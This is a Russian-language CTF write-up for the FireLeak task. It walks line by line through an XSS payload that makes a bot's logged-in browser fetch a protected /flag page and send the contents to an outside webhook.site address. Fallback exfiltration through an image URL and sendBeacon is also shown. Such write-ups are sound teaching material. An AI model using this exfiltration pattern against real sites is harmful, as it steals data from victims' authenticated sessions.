## Утилита на JavaScript + webhook.site в задаче FireLeak
### 1. Контекст задачи
В отчёте по задаче FireLeak (PwnSec CTF 2025) используется маленький сценарий на JavaScript, который запускается в браузере жертвы (бота организаторов).
Браузер бота:
- уже авторизован на сайте соревнования;
- имеет право читать скрытый адрес /flag;
- но мы не имеем прямого доступа к этому адресу.

### 2. Сам сценарий 
В отчёте приведён сценария:
const webhookUrl = 'https://webhook.site/96bc0b36-0839-4817-91df-5e6fcb7e7162';

```
fetch('https://338477c9fc23aa4e.chal.ctf.ae/flag')
  .then(r => r.text())
  .then(flag => {
    fetch(webhookUrl, {
      method: 'POST',
      body: JSON.stringify({ flag: flag }),
      headers: { 'Content-Type': 'application/json' }
    });
  });
```

Дальше я дальше буду разбирать его по шагам.


### 3. Подробный разбор кода
#### 3.1. Переменная с адресом приёмника
```
const webhookUrl = 'https://webhook.site/96bc0b36-0839-4817-91df-5e6fcb7e7162';
```
```const``` — это объявление постоянной переменной: мы один раз задаём значение, и оно не меняется.
```webhookUrl``` — просто имя переменной, чтобы не копировать длинный адрес каждый раз.
Строка в кавычках — персональный адрес, который мне выдал сайт ```webhook.site```.

На этот адрес будет отправляться сообщение с флагом. Всё, что отправлено туда, я увижу в веб-интерфейсе на webhook.site.

#### 3.2. Обращение к закрытому адресу /flag
```
fetch('https://338477c9fc23aa4e.chal.ctf.ae/flag')
  .then(r => r.text())
  .then(flag => {
    ...
  });
```

Здесь происходит самое важное: браузер жертвы делает запрос к закрытой странице ```/flag```.
```fetch('https://3384.../flag')```
Браузер отправляет сетевой запрос на этот адрес от имени текущего пользователя.

Это значит:
- браузер автоматически прикладывает к запросу все служебные файлы (куки) и заголовки авторизации;
- если у жертвы есть доступ к ```/flag```, то сервер ответит содержимым флага.
- ```.then(r => r.text())```
Когда ответ пришёл, он сначала содержится в специальном объекте ```r```.

Вызов r.text() говорит: «Преобразуй тело ответа в обычную текстовую строку».

Для нас это и есть строка флага.
```.then(flag => { ... })```
Сюда уже попадает готовый текст флага.
Внутри фигурных скобок мы можем делать с ним что угодно: вывести в консоль, где-то показать, отправить наружу и т.д. В нашей задаче мы отправляем его на свой адрес.
Важно: я, как нападающий, не могу напрямую вызвать этот /flag со своего компьютера — у меня нет нужных служебных файлов и права доступа. Поэтому я заставляю это сделать браузер жертвы, который эти права имеет.

#### 3.3. Отправка флага на свой адрес
fetch(webhookUrl, {
  method: 'POST',
  body: JSON.stringify({ flag: flag }),
  headers: { 'Content-Type': 'application/json' }
});
Теперь в руки у нас уже есть переменная flag (строка). Нужно отправить её себе.
Снова вызывается fetch, но уже:
не к CTF-сайту,
а к нашему адресу webhookUrl (то есть webhook.site).
Разберём параметры:
fetch(webhookUrl, { ... })
Отправляем сетевой запрос на адрес, который записан в webhookUrl.
method: 'POST'

Мы явно говорим: это запрос с передачей данных (как отправка формы).
Можно было бы использовать и GET с параметром в адресе, но через POST удобнее передавать структуру.
body: JSON.stringify({ flag: flag })
Здесь мы формируем тело запроса:
{ flag: flag } — это объект, у которого одно поле flag, и в нём лежит само значение флага;
o
o
JSON.stringify(...) превращает этот объект в обычную текстовую строку вида:
o
{"flag":"PWNSEC{...}"}
o
Формат JSON — это просто текст в фигурных скобках, где данные записаны «ключ: значение».

headers: { 'Content-Type': 'application/json' }
Этим мы честно сообщаем принимающей стороне:
«Внутри тела запроса у нас текст в формате JSON».
Сервис webhook.site просто показывает мне всё, что пришло: метод, адрес, заголовки и тело. То есть я прямо вижу строку "flag": "PWNSEC{...}".

### 4. Возможные улучшения утилиты (по мотивам полного варианта из отчёта)

Если один способ пересылки флага вдруг не сработает, есть резервные методы.
Например, дополнительно можно:

- создать картинку:

```
const img = new Image();
img.src = webhookUrl + '?flag=' + encodeURIComponent(flag);
```

Здесь флаг уезжает как часть адреса (параметр ```flag```).

- использовать фоновую отправку:

```
avigator.sendBeacon(webhookUrl, 'flag=' + encodeURIComponent(flag));
```

Это полезно, если страницу сразу закрывают — отправка всё равно успевает произойти.



В итоге эта небольшая утилита на JavaScript в связке с сервисом webhook.site показывает, как на практике выглядит утечка данных через браузер пользователя при уязвимости типа XSS (вставка чужого сценария на страницу). Здесь я напрямую не взламываю криптографию и не подбираю пароли — я просто использую то, что браузер жертвы уже имеет законный доступ к /flag, и переориентирую этот доступ на себя.

По сути, утилита выполняет три простых шага:

1. Определяет внешний «почтовый ящик» для флага (личный URL на webhook.site).

2. Просит браузер жертвы прочитать скрытый ресурс /flag, пользуясь его действующей сессией.

3. Пересылает прочитанный флаг на мой внешний адрес в удобном для анализа виде (JSON).
